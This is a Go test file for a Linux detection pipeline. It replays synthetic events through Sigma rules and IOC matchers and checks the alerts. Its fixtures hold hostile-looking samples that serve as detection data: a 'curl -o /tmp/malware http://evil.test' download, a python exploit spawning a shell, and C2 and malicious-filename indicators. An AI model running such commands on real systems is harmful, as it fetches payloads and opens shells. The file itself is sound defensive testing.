package distributor_test

import (
	"bytes"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Nextron-Labs/aurora-linux/lib/consumer/ioc"
	"github.com/Nextron-Labs/aurora-linux/lib/consumer/sigma"
	"github.com/Nextron-Labs/aurora-linux/lib/distributor"
	"github.com/Nextron-Labs/aurora-linux/lib/enrichment"
	"github.com/Nextron-Labs/aurora-linux/lib/provider"
	"github.com/Nextron-Labs/aurora-linux/lib/provider/replay"
	log "github.com/sirupsen/logrus"
)

// TestPipelineReplayToSigmaMatch exercises the full pipeline:
// Replay provider → Distributor (with enrichment) → Sigma consumer → alert output.
func TestPipelineReplayToSigmaMatch(t *testing.T) {
	// 1. Write a Sigma rule that detects base64 decode.
	ruleDir := t.TempDir()
	writeFile(t, ruleDir, "base64_decode.yml", `title: Base64 Decode
id: e2072cab-8c9a-459b-b63c-40ae79e27031
status: test
author: Unit Test
level: medium
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: "/base64"
    CommandLine|contains: " -d"
  condition: selection
`)

	// 2. Set up Sigma consumer.
	var sigmaOut bytes.Buffer
	sigmaLogger := log.New()
	sigmaLogger.SetOutput(&sigmaOut)
	sigmaLogger.SetFormatter(&log.JSONFormatter{DisableTimestamp: true})
	sigmaLogger.SetLevel(log.DebugLevel)

	sigmaConsumer := sigma.New(sigma.Config{
		Logger:   sigmaLogger,
		MinLevel: "info",
	})
	if err := sigmaConsumer.Initialize(); err != nil {
		t.Fatalf("Sigma Initialize() error = %v", err)
	}
	if err := sigmaConsumer.InitializeWithRules([]string{ruleDir}); err != nil {
		t.Fatalf("InitializeWithRules() error = %v", err)
	}

	// 3. Set up the distributor with enrichment.
	correlator, err := enrichment.NewCorrelator(1024)
	if err != nil {
		t.Fatalf("NewCorrelator() error = %v", err)
	}
	enricher := enrichment.NewEventEnricher()
	distributor.RegisterLinuxEnrichments(enricher, correlator)

	dist := distributor.New(enricher, correlator)
	dist.RegisterConsumer(sigmaConsumer)

	// 4. Write replay JSONL with a matching event.
	replayDir := t.TempDir()
	replayPath := filepath.Join(replayDir, "events.jsonl")
	writeFile(t, replayDir, "events.jsonl", strings.Join([]string{
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/usr/bin/base64","CommandLine":"base64 -d /tmp/encoded.b64","ProcessId":"1234","ParentProcessId":"1000","User":"root"}`,
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/usr/bin/ls","CommandLine":"ls -la /tmp","ProcessId":"1235","ParentProcessId":"1000","User":"root"}`,
	}, "\n")+"\n")

	// 5. Replay events through the distributor.
	rp := replay.New(replayPath)
	rp.SendEvents(func(event provider.Event) {
		dist.HandleEvent(event)
	})

	// 6. Verify results.
	if dist.Processed() != 2 {
		t.Fatalf("Processed() = %d, want 2", dist.Processed())
	}
	if sigmaConsumer.Matches() != 1 {
		t.Fatalf("Sigma Matches() = %d, want 1", sigmaConsumer.Matches())
	}

	// Verify the Sigma match output contains expected fields.
	lines := decodeJSONLines(t, &sigmaOut)
	if len(lines) != 1 {
		t.Fatalf("expected 1 sigma alert line, got %d", len(lines))
	}
	if got, _ := lines[0]["sigma_title"].(string); got != "Base64 Decode" {
		t.Fatalf("sigma_title = %q, want Base64 Decode", got)
	}
	if got, _ := lines[0]["Image"].(string); got != "/usr/bin/base64" {
		t.Fatalf("Image = %q, want /usr/bin/base64", got)
	}
}

// TestPipelineReplayToIOCMatch exercises: Replay → Distributor → IOC consumer.
func TestPipelineReplayToIOCMatch(t *testing.T) {
	tmpDir := t.TempDir()

	// 1. Write filename IOC file.
	filenameIOCPath := filepath.Join(tmpDir, "filename-iocs.txt")
	writeFile(t, tmpDir, "filename-iocs.txt", strings.Join([]string{
		`(?i)/tmp/evil\.sh;90`,
		`(?i)\.suspicious$;70`,
	}, "\n")+"\n")

	// 2. Write C2 IOC file.
	c2IOCPath := filepath.Join(tmpDir, "c2-iocs.txt")
	writeFile(t, tmpDir, "c2-iocs.txt", strings.Join([]string{
		"evil-c2.example.com",
		"198.51.100.42",
	}, "\n")+"\n")

	// 3. Set up IOC consumer.
	var iocOut bytes.Buffer
	iocLogger := log.New()
	iocLogger.SetOutput(&iocOut)
	iocLogger.SetFormatter(&log.JSONFormatter{DisableTimestamp: true})
	iocLogger.SetLevel(log.DebugLevel)

	iocConsumer := ioc.New(ioc.Config{
		FilenameIOCPath:     filenameIOCPath,
		C2IOCPath:           c2IOCPath,
		FilenameIOCRequired: true,
		C2IOCRequired:       true,
		Logger:              iocLogger,
	})
	if err := iocConsumer.Initialize(); err != nil {
		t.Fatalf("IOC Initialize() error = %v", err)
	}

	// 4. Set up distributor (no enrichment needed for IOC-only test).
	dist := distributor.New(enrichment.NewEventEnricher(), nil)
	dist.RegisterConsumer(iocConsumer)

	// 5. Write replay events.
	replayPath := filepath.Join(tmpDir, "events.jsonl")
	writeFile(t, tmpDir, "events.jsonl", strings.Join([]string{
		// Filename IOC match (evil.sh in TargetFilename)
		`{"_provider":"LinuxEBPF","_eventID":11,"_source":"LinuxEBPF:FileCreate","TargetFilename":"/tmp/evil.sh","Image":"/usr/bin/curl","ProcessId":"100"}`,
		// C2 IOC match (IP in DestinationIp)
		`{"_provider":"LinuxEBPF","_eventID":3,"_source":"LinuxEBPF:NetConnect","DestinationIp":"198.51.100.42","DestinationPort":"443","Image":"/usr/bin/curl","ProcessId":"101"}`,
		// Clean event — no match
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/usr/bin/ls","CommandLine":"ls /home","ProcessId":"102"}`,
	}, "\n")+"\n")

	// 6. Replay.
	rp := replay.New(replayPath)
	rp.SendEvents(func(event provider.Event) {
		dist.HandleEvent(event)
	})

	// 7. Verify.
	if dist.Processed() != 3 {
		t.Fatalf("Processed() = %d, want 3", dist.Processed())
	}
	if iocConsumer.Matches() != 2 {
		t.Fatalf("IOC Matches() = %d, want 2", iocConsumer.Matches())
	}

	lines := decodeJSONLines(t, &iocOut)
	if len(lines) != 2 {
		t.Fatalf("expected 2 IOC alert lines, got %d", len(lines))
	}

	// First match: filename IOC.
	iocTypes := make(map[string]bool)
	for _, line := range lines {
		if typ, ok := line["ioc_type"].(string); ok {
			iocTypes[typ] = true
		}
	}
	if !iocTypes["filename"] {
		t.Fatal("expected filename IOC match in output")
	}
	if !iocTypes["c2"] {
		t.Fatal("expected C2 IOC match in output")
	}
}

// TestPipelineSigmaAndIOCTogether exercises both consumers simultaneously.
func TestPipelineSigmaAndIOCTogether(t *testing.T) {
	tmpDir := t.TempDir()

	// Sigma rule: detect curl to /tmp.
	ruleDir := filepath.Join(tmpDir, "rules")
	os.MkdirAll(ruleDir, 0755)
	writeFile(t, ruleDir, "curl_tmp.yml", `title: Curl Download to Tmp
id: 11111111-1111-1111-1111-111111111111
status: test
author: Unit Test
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: "/curl"
    CommandLine|contains: "/tmp/"
  condition: selection
`)

	// Filename IOC.
	filenameIOCPath := filepath.Join(tmpDir, "filename-iocs.txt")
	writeFile(t, tmpDir, "filename-iocs.txt", `(?i)/tmp/malware;95`+"\n")

	// Sigma consumer.
	var sigmaOut bytes.Buffer
	sigmaLogger := log.New()
	sigmaLogger.SetOutput(&sigmaOut)
	sigmaLogger.SetFormatter(&log.JSONFormatter{DisableTimestamp: true})
	sigmaLogger.SetLevel(log.DebugLevel)

	sigmaConsumer := sigma.New(sigma.Config{
		Logger:   sigmaLogger,
		MinLevel: "info",
	})
	sigmaConsumer.Initialize()
	if err := sigmaConsumer.InitializeWithRules([]string{ruleDir}); err != nil {
		t.Fatalf("InitializeWithRules() error = %v", err)
	}

	// IOC consumer.
	var iocOut bytes.Buffer
	iocLogger := log.New()
	iocLogger.SetOutput(&iocOut)
	iocLogger.SetFormatter(&log.JSONFormatter{DisableTimestamp: true})
	iocLogger.SetLevel(log.DebugLevel)

	iocConsumer := ioc.New(ioc.Config{
		FilenameIOCPath:     filenameIOCPath,
		FilenameIOCRequired: true,
		Logger:              iocLogger,
	})
	if err := iocConsumer.Initialize(); err != nil {
		t.Fatalf("IOC Initialize() error = %v", err)
	}

	// Distributor with both consumers.
	correlator, _ := enrichment.NewCorrelator(1024)
	enricher := enrichment.NewEventEnricher()
	distributor.RegisterLinuxEnrichments(enricher, correlator)
	dist := distributor.New(enricher, correlator)
	dist.RegisterConsumer(sigmaConsumer)
	dist.RegisterConsumer(iocConsumer)

	// Event that triggers BOTH Sigma AND IOC.
	replayPath := filepath.Join(tmpDir, "events.jsonl")
	writeFile(t, tmpDir, "events.jsonl",
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/usr/bin/curl","CommandLine":"curl -o /tmp/malware http://evil.test","ProcessId":"500","ParentProcessId":"1","User":"attacker"}`+"\n")

	rp := replay.New(replayPath)
	rp.SendEvents(func(event provider.Event) {
		dist.HandleEvent(event)
	})

	if sigmaConsumer.Matches() != 1 {
		t.Fatalf("Sigma Matches() = %d, want 1", sigmaConsumer.Matches())
	}
	if iocConsumer.Matches() != 1 {
		t.Fatalf("IOC Matches() = %d, want 1", iocConsumer.Matches())
	}
}

// TestPipelineParentEnrichmentFromCorrelator verifies that process_creation
// events populate the correlator cache and subsequent events get enriched
// parent fields.
func TestPipelineParentEnrichmentFromCorrelator(t *testing.T) {
	tmpDir := t.TempDir()

	// Sigma rule that matches on ParentImage.
	ruleDir := filepath.Join(tmpDir, "rules")
	os.MkdirAll(ruleDir, 0755)
	writeFile(t, ruleDir, "suspicious_parent.yml", `title: Suspicious Python Child
id: 22222222-2222-2222-2222-222222222222
status: test
author: Unit Test
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    ParentImage|endswith: "/python3"
    Image|endswith: "/sh"
  condition: selection
`)

	var sigmaOut bytes.Buffer
	sigmaLogger := log.New()
	sigmaLogger.SetOutput(&sigmaOut)
	sigmaLogger.SetFormatter(&log.JSONFormatter{DisableTimestamp: true})
	sigmaLogger.SetLevel(log.DebugLevel)

	sigmaConsumer := sigma.New(sigma.Config{Logger: sigmaLogger, MinLevel: "info"})
	sigmaConsumer.Initialize()
	if err := sigmaConsumer.InitializeWithRules([]string{ruleDir}); err != nil {
		t.Fatalf("InitializeWithRules() error = %v", err)
	}

	correlator, _ := enrichment.NewCorrelator(1024)
	enricher := enrichment.NewEventEnricher()
	distributor.RegisterLinuxEnrichments(enricher, correlator)
	dist := distributor.New(enricher, correlator)
	dist.RegisterConsumer(sigmaConsumer)

	// Event 1: parent process (python3) — populates correlator cache.
	// Event 2: child process (sh) with ParentProcessId pointing to python3.
	//   The child does NOT have ParentImage set — it should be enriched from cache.
	replayPath := filepath.Join(tmpDir, "events.jsonl")
	writeFile(t, tmpDir, "events.jsonl", strings.Join([]string{
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/usr/bin/python3","CommandLine":"python3 exploit.py","ProcessId":"500","ParentProcessId":"1","User":"www-data"}`,
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/bin/sh","CommandLine":"sh -c id","ProcessId":"501","ParentProcessId":"500","User":"www-data"}`,
	}, "\n")+"\n")

	rp := replay.New(replayPath)
	rp.SendEvents(func(event provider.Event) {
		dist.HandleEvent(event)
	})

	if sigmaConsumer.Matches() != 1 {
		t.Fatalf("Sigma Matches() = %d, want 1 (parent enrichment should enable ParentImage match)", sigmaConsumer.Matches())
	}

	lines := decodeJSONLines(t, &sigmaOut)
	if len(lines) != 1 {
		t.Fatalf("expected 1 sigma alert, got %d", len(lines))
	}
	if got, _ := lines[0]["sigma_title"].(string); got != "Suspicious Python Child" {
		t.Fatalf("sigma_title = %q, want Suspicious Python Child", got)
	}
}

// TestPipelineNoFalsePositiveOnCleanEvents verifies that clean events
// produce zero matches across both consumers.
func TestPipelineNoFalsePositiveOnCleanEvents(t *testing.T) {
	tmpDir := t.TempDir()

	ruleDir := filepath.Join(tmpDir, "rules")
	os.MkdirAll(ruleDir, 0755)
	writeFile(t, ruleDir, "evil_only.yml", `title: Detect Evil Binary
id: 33333333-3333-3333-3333-333333333333
status: test
author: Unit Test
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: "/evil-binary"
  condition: selection
`)

	filenameIOCPath := filepath.Join(tmpDir, "filename-iocs.txt")
	writeFile(t, tmpDir, "filename-iocs.txt", `(?i)/tmp/rootkit;95`+"\n")

	var sigmaOut, iocOut bytes.Buffer
	sigmaLogger := log.New()
	sigmaLogger.SetOutput(&sigmaOut)
	sigmaLogger.SetFormatter(&log.JSONFormatter{DisableTimestamp: true})
	iocLogger := log.New()
	iocLogger.SetOutput(&iocOut)
	iocLogger.SetFormatter(&log.JSONFormatter{DisableTimestamp: true})

	sigmaConsumer := sigma.New(sigma.Config{Logger: sigmaLogger, MinLevel: "info"})
	sigmaConsumer.Initialize()
	sigmaConsumer.InitializeWithRules([]string{ruleDir})

	iocConsumer := ioc.New(ioc.Config{
		FilenameIOCPath:     filenameIOCPath,
		FilenameIOCRequired: true,
		Logger:              iocLogger,
	})
	iocConsumer.Initialize()

	dist := distributor.New(enrichment.NewEventEnricher(), nil)
	dist.RegisterConsumer(sigmaConsumer)
	dist.RegisterConsumer(iocConsumer)

	// All clean events.
	replayPath := filepath.Join(tmpDir, "events.jsonl")
	writeFile(t, tmpDir, "events.jsonl", strings.Join([]string{
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/usr/bin/ls","CommandLine":"ls /home","ProcessId":"1"}`,
		`{"_provider":"LinuxEBPF","_eventID":1,"_source":"LinuxEBPF:ProcessExec","Image":"/usr/bin/cat","CommandLine":"cat /etc/hosts","ProcessId":"2"}`,
		`{"_provider":"LinuxEBPF","_eventID":11,"_source":"LinuxEBPF:FileCreate","TargetFilename":"/home/user/notes.txt","Image":"/usr/bin/vim","ProcessId":"3"}`,
	}, "\n")+"\n")

	rp := replay.New(replayPath)
	rp.SendEvents(func(event provider.Event) {
		dist.HandleEvent(event)
	})

	if sigmaConsumer.Matches() != 0 {
		t.Fatalf("Sigma Matches() = %d, want 0 for clean events", sigmaConsumer.Matches())
	}
	if iocConsumer.Matches() != 0 {
		t.Fatalf("IOC Matches() = %d, want 0 for clean events", iocConsumer.Matches())
	}
	if dist.Processed() != 3 {
		t.Fatalf("Processed() = %d, want 3", dist.Processed())
	}
}

// --- helpers ---

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0600); err != nil {
		t.Fatalf("WriteFile(%q) error = %v", path, err)
	}
}

func decodeJSONLines(t *testing.T, buf *bytes.Buffer) []map[string]interface{} {
	t.Helper()
	var lines []map[string]interface{}
	for _, raw := range strings.Split(strings.TrimSpace(buf.String()), "\n") {
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		var m map[string]interface{}
		if err := json.Unmarshal([]byte(raw), &m); err != nil {
			t.Fatalf("json.Unmarshal() error = %v (line=%q)", err, raw)
		}
		lines = append(lines, m)
	}
	return lines
}

// panicConsumer always panics when handling an event.
type panicConsumer struct{}

func (p *panicConsumer) Name() string           { return "panic-consumer" }
func (p *panicConsumer) Initialize() error       { return nil }
func (p *panicConsumer) HandleEvent(_ provider.Event) error {
	panic("deliberate panic in consumer")
}
func (p *panicConsumer) Close() error            { return nil }

// countConsumer counts events received.
type countConsumer struct {
	count int
}

func (c *countConsumer) Name() string                       { return "count-consumer" }
func (c *countConsumer) Initialize() error                  { return nil }
func (c *countConsumer) HandleEvent(_ provider.Event) error { c.count++; return nil }
func (c *countConsumer) Close() error                       { return nil }

// TestDistributorPanicRecovery verifies that a panicking consumer does not
// crash the distributor or prevent other consumers from receiving events.
func TestDistributorPanicRecovery(t *testing.T) {
	enricher := enrichment.NewEventEnricher()
	correlator, err := enrichment.NewCorrelator(128)
	if err != nil {
		t.Fatalf("NewCorrelator: %v", err)
	}

	d := distributor.New(enricher, correlator)

	counter := &countConsumer{}
	d.RegisterConsumer(&panicConsumer{}) // registered first — panics on every event
	d.RegisterConsumer(counter)          // registered second — must still receive events

	// Create a minimal event and send it through the distributor.
	eventDir := t.TempDir()
	writeFile(t, eventDir, "event.jsonl", `{"EventID":1,"ProviderName":"LinuxEBPF","ProcessId":1234,"Image":"/usr/bin/test","CommandLine":"test"}`)

	rp := replay.New(filepath.Join(eventDir, "event.jsonl"))
	rp.SendEvents(d.HandleEvent)

	if counter.count == 0 {
		t.Fatal("count-consumer received 0 events; panic in first consumer killed the pipeline")
	}
	if d.Processed() == 0 {
		t.Fatal("distributor processed 0 events after panic recovery")
	}
}

func init() {
	// Suppress standard logger output during tests.
	log.SetOutput(io.Discard)
}
